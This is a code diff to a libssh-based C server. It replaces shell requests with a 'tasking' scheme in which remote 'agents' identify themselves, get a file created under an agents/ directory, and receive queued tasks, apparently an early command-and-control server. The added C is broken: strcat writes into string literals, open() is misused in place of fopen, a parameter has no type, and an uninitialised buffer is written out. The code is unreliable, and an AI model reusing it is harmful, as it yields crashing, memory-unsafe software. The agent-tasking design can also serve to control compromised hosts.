@@ -36,6 +36,7 @@ http://api.libssh.org/stable/libssh_tutorial.html
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
+#include <dirent.h>
 
 
 #ifdef HAVE_ARGP_H
@@ -316,6 +317,43 @@ int parse_command(char* comm, struct clientDat clistruct){
     return -1;
 }
 
+int directory_exists( const char* pzPath ){
+    /*Tests if a directory exists in the file system */
+    if ( pzPath == NULL) return 0;
+    DIR *pDir;
+    int bExists = 0;
+    pDir = opendir (pzPath);
+    if (pDir != NULL)
+    {
+        bExists = 1;
+        (void) closedir (pDir);
+    }
+
+   return bExists;
+}
+
+
+int check_if_exist(agent_id) {
+    if(directory_exists(strcat("agents/", agent_id))){
+        return 1;
+    }
+    return 0;
+}
+
+void init_agent(char *agent_id){
+    FILE *fd = NULL;
+    fd = open(strcat("agents/", agent_id), "w");
+    char data[512];
+
+    /*
+    prep data in here
+    */
+
+
+    fwrite(data, 1, strlen(data), fd);
+    fclose(fd);
+}
+
 
 void *ssh_handler(void* sess){
     struct clientDat pass = *(struct clientDat*) sess;
@@ -344,7 +382,7 @@ void *ssh_handler(void* sess){
                         break;
                     }
                 default:
-                ssh_message_reply_default(message);
+                    ssh_message_reply_default(message);
             }
             ssh_message_free(message);
         }
@@ -362,9 +400,9 @@ void *ssh_handler(void* sess){
         if(message && ssh_message_type(message)==SSH_REQUEST_CHANNEL &&
            ssh_message_subtype(message)==SSH_CHANNEL_REQUEST_SHELL){
 //            if(!strcmp(ssh_message_channel_request_subsystem(message),"sftp")){
-				printf("Client %d: Got shell request\n", id);
+				printf("Client %d: Got tasking request\n", id);
                 sftp=1;
-                msgType = REQ_SHELL;
+                msgType = REQ_TASKING;
                 ssh_message_channel_request_reply_success(message);
                 break;
  //           }
@@ -394,14 +432,29 @@ void *ssh_handler(void* sess){
     switch (msgType)
     {
     case REQ_EXEC:
+    /*
+        Tasking goes like this:
+            Client connects and requests tasking (through requesting a shell interface)
+            Server retrieves client ID (precompiled?), and checks it against existing files
+                if it doesnt have any existing files, then it will create one and return that there is nothing to do (0)
+            
+                If it does have stuff in the file, it will parse it and send it to the client in a parsable format.
+                The client channel is then passed off to a secondary handler who will just help it complete the tasking
+    
+    */
         printf("Client %d: waiting for command\n", id);
-        const char* test = ssh_message_channel_request_command(message);
-        printf("Client %d: got: %s\n", id, test);
+        const char* agent_id = ssh_message_channel_request_command(message);
+        printf("Client %d: got identifier: %s\n", id, agent_id);
 
-        ssh_channel_write(chan, test, strlen(test));
+        int exists = check_if_exist(agent_id);
+        if(!exists){
+            init_agent(agent_id);
+        }
+
+        ssh_channel_write(chan, agent_id, strlen(agent_id));
         printf("Client %d: wrote data to channel\n", id);
         break;
-    case REQ_SHELL:
+    case REQ_TASKING:
         do{
 		    i=ssh_channel_read(chan,buf, sizeof(buf), 0);
 		    if (!strncmp(buf, "exit", 4)) {
